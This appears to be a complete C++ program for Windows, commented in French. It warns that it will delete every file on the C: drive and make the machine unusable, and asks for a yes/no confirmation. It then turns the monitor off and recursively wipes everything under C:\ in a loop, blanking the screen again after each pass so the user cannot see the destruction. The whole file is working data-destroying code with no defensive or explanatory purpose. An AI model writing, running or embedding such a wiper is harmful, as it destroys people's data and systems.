#include <iostream>
#include <string>
#include <filesystem>
#include <windows.h>

// Fonction pour mettre l'écran en veille
void set_screen_sleep() {
    // Envoie une commande pour éteindre l'écran
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
}

// Fonction pour supprimer tous les fichiers d'un répertoire de manière récursive
void delete_all_files(const std::string& path) {
    // Parcourir le répertoire et supprimer les fichiers et répertoires de manière récursive
    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(path)) {
            try {
                if (entry.is_regular_file()) {
                    std::filesystem::remove(entry.path());
                    std::cout << "Supprimé : " << entry.path() << std::endl;
                } else if (entry.is_directory()) {
                    std::filesystem::remove_all(entry.path());
                    std::cout << "Répertoire supprimé : " << entry.path() << std::endl;
                }
            } catch (const std::exception& e) {
                std::cout << "Erreur lors de la suppression de " << entry.path() << ": " << e.what() << std::endl;
            }
        }
    } catch (const std::exception& e) {
        std::cout << "Erreur lors de l'accès au répertoire " << path << ": " << e.what() << std::endl;
    }
}

int main() {
    // Demander à l'utilisateur une confirmation avant d'agir
    std::cout << "Le programme va tenter de supprimer **tous les fichiers** sur le disque. Cela rendra la machine inutilisable." << std::endl;
    std::cout << "Êtes-vous sûr de vouloir continuer ? (O/N): ";
    
    char confirmation;
    std::cin >> confirmation;

    if (confirmation == 'O' || confirmation == 'o') {
        // Mettre l'écran en veille avant de commencer
        set_screen_sleep();

        // Chemin de la racine de l'OS Windows ou de tout le disque pour tout supprimer
        std::string root_path = "C:\\";  // Pour Windows, commence à la racine du disque C:

        // Boucle de suppression des fichiers
        while (true) {
            bool deletedAnyFile = false;

            // Supprimer tous les fichiers du disque
            delete_all_files(root_path);

            // Mettre l'écran en veille après chaque boucle de suppression
            set_screen_sleep();

            // Attendre 1 seconde avant de relancer (peut être ajusté)
            Sleep(1000);

            // On arrête la boucle si plus aucun fichier n'est supprimé
            deletedAnyFile = false;
            for (const auto& entry : std::filesystem::recursive_directory_iterator(root_path)) {
                deletedAnyFile = true;
                break; // Si on a trouvé des fichiers, on arrête de chercher
            }

            if (!deletedAnyFile) {
                std::cout << "Tout a été supprimé." << std::endl;
                break;
            }
        }
    } else {
        std::cout << "Opération annulée. Aucune modification effectuée." << std::endl;
    }

    return 0;
}
